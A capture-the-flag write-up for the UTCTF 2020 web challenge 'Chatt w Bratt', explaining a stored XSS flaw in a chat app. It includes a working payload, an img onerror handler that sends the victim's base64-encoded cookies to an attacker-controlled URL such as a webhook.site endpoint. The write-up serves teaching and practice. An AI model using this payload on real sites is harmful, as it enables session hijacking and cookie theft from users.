# Chatt w Bratt
* **Event:** UTCTF 2020
* **Problem: Type:** Web
* **Difficulty:** Medium

## Background
You have been granted the ability to use an ADVANCED web-chat client to have a 1-on-1 
conversation with world-famous human Bratt. Unfortunately, this decision was made in a 
haste and as a result the web-chat client is actually not that advanced and has a glaring 
flaw...

#### Solution
The Chatt with Bratt web app is vulnerable to XSS - you can send a message with 
JavaScript / HTML and it will not be escaped by the Web Server or Web Client! 
Additionally, important information is stored in cookies! Given this information, you are 
looking to leak Bratt's cookies by sending a message with some malicious code - all of 
this is known as session hacking. An example message you can send would look something 
like the following: <img src='x' onerror="fetch('website_you_have_access_to?cookie=' + 
btoa(document.cookie))">. What this solution does is create an image element in the Web 
Client, and onerror (which will run since 'x' is not a valid image source) will execute a 
script which encodes into Base64 the cookies of whoever is using the Web Client and sends 
the cookies over to a website you have control of. If you don't have your own website, 
you can use a [web hook](https://webhook.site). This give you a URL to send requests to 
and allows you to see those requests. By sending this message, Bratt will eventually load 
the message on his send and his Web Client will execute the script you included to send a 
requests to your URL with his cookies encoded, which will contain the flag when you 
decode the cookies
